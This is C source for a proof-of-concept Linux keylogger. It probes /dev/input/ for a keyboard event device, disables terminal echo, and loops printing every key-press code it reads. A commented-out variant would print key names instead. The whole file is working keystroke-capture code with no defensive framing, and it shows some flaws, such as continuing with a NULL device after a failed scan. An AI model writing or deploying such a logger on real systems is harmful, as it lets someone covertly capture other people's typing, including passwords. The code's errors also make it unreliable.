/** POC event interface key logger
 * 
 *  Records all keystrokes from the event
 *  devices in /dev/input/
 * 
 *  The event interface must be enabled and
 *  the keyboard must be in raw scancode
 *  mode, which from testing seems to be the norm
 * 
 *  Eddie Bell - ebell@bluebottle.com
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <termios.h>
#include <signal.h>

#define PATH "/dev/input/"

#define PROBE_FAILED -1
#define PROBE_NO_RESPONSE 0
#define PROBE_MATCH 1

#define ECHO_OFF 0
#define ECHO_ON 1

/*
 * Scancode conversion array
 */

char *keycode[256] =
{ "", "<esc>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
  "-", "=", "<backspace>",
  "<tab>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[",
  "]", "\n", "<control>", "a", "s", "d", "f", "g",
  "h", "j", "k", "l", ";", "'", "", "<shift>",
  "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
  "/", "<shift>", "", "<alt>", " ", "<capslock>", "<f1>",
  "<f2>", "<f3>", "<f4>", "<f5>", "<f6>", "<f7>", "<f8>", "<f9>",
  "<f10>", "<numlock>", "<scrolllock>", "", "", "", "", "", "", "",
  "", "", "", "\\", "f11", "f12", "", "", "", "", "", "",
  "", "", "<control>", "", "<sysrq>"
};

char buf[1024];
int fd = -1;

/*
 * Disables terminal echoing
 */

void
echoctl (int type)
{
  static struct termios tc;
  static struct termios ots;

  if (type == ECHO_OFF)
  {
    // save current settings
    tcgetattr (STDIN_FILENO, &tc);
    ots = tc;
    // disable echo
    tc.c_lflag &= ~ECHO;
    tc.c_lflag |= ECHONL;
    tcsetattr (STDIN_FILENO, TCSAFLUSH, &tc);
  }
  else
  {
    // enable echo
    tcsetattr (STDIN_FILENO, TCSAFLUSH, &ots);
  }
}

/*
 * * turn character echoing back on
 * */

void
handler (int sig)
{
  echoctl (ECHO_ON);
  printf ("\nexiting...(%d)\n", sig);
  exit (0);
}

void
perror_exit (char *error)
{
  perror (error);
  handler (9);
}

/*
 * Process the raw scancodes
 */

void
read_keys (int rfd, char *keys[])
{
  struct input_event ev[64];
  int rd, value, size = sizeof (struct input_event);

  while (1)
  {
    if ((rd = read (rfd, ev, size * 64)) < size)
      perror_exit ("read()");

    // Only read the key press event
    // NOT the key release event

    value = ev[0].value;
    // Sam's change
//    if (value != ' ' && ev[1].value == 1 && ev[1].type == 1)
//    {
//      if (keys[value] != NULL)
//      {
//	printf ("%s", (keys[value]));
//	fflush (stdout);
//      }
//    }
    if (ev[1].type == 1 && ev[1].value == 1)
      printf("%d\n", value);
    fflush(stdout);
  }

}

/*
 * check if a device responds to keyboard input
 */

int
test_device (char buf[])
{
  int fd, results;
  char inbuf[128];
  char testbuffer[10] = "proboscis!";
  fd_set rfds;
  struct timeval tv;

  if ((fd = open (buf, O_RDONLY | O_NONBLOCK)) < 0)
    return PROBE_FAILED;
  else
  {
    // send character to keyboard
    getchar ();
    // check if device has outputted the data
    results = read (fd, inbuf, 128);
    close(fd);

    if(results > 0)
      return PROBE_MATCH;
    else
      return PROBE_NO_RESPONSE;
  }
}

/*
 * * Check each device in /dev/input and determine if
 * * it is a keyboard device
 * */

char *
scan_for_devices ()
{

  DIR *event_devices = opendir (PATH);
  struct dirent *dir = NULL;
  int found = PROBE_NO_RESPONSE;

  if (event_devices == NULL)
  {
    printf ("Cannot open the event interface directory (%s)\n", PATH);
    perror_exit ("opendir()");
  }

  printf ("scanning for devices in %s\n\n", PATH);
  printf ("* NOTE: Please hold down the enter key to provide test data *\n");
  getchar ();

  // scan through /dev/input/* checking for activity whilst simulating keyboard activity
  while ((dir = readdir (event_devices)) != NULL && (found != PROBE_MATCH))
  {
    // ignore this and parent directory
    if ((strncmp (dir->d_name, ".", 1)) != 0)
    {
      snprintf (buf, 1024, "%s%s", PATH, dir->d_name);
      printf ("\ttrying %s", dir->d_name);
      found = test_device (buf);
    }
  }

  printf ("\n");

  if (found == PROBE_MATCH)
    return buf;
  else
    return NULL;
}

int
main (int argc, char *argv[])
{
  char name[256] = "Unknown";
  char *device = NULL;
  int i = 25;

  //printf ("Proboscis - Eddie Bell <ebellbluebottle.com>\n");

  if (argv[1] == NULL)
  {
    printf ("Please specify (on the commandlime) the path to the dev event interface device\n");
    printf ("If you do not know which device to specify, use the argument 'scan'\n");
    exit (0);
  }

  if ((getuid ()) != 0)
    printf ("You are not root! This may not work...\n");

  if (argc > 1)
    device = argv[1];

  // turn terminal echo'ing off whilst scanning
  echoctl (ECHO_OFF);

  if ((strncmp (device, "scan", 4)) == 0)
  {
    if ((device = scan_for_devices ()) == NULL)
      printf ("Cannot find event device. Are you sure the event device is enabled?\n");
  }

  if ((fd = open (device, O_RDONLY)) == -1)
  {
    printf ("%s is not a vaild device. try using the argument 'scan'\n", device);
  }

  ioctl (fd, EVIOCGNAME (sizeof (name)), name);
  //printf ("Reading From : %s (%s)\n", device, name);

  // handle all singles so the device will be closed before exit
  while (i--)
    signal (i, &handler);

  read_keys (fd, keycode);
  return 0;
}
